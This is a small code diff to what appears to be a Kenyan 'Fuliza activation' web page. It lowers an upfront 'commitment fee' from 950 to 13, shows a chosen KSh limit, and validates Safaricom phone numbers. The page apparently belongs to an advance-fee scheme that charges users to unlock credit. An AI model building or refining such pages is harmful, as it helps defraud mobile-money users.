@@ -56,7 +56,7 @@ Complete this step to proceed to the <b>final Fuliza activation stage</b>.
 const selectedAmount = localStorage.getItem("selectedAmount") || "0";
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const commitmentFee = 950;
+const commitmentFee = 13;
 
 function isSafaricom(number){
   return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
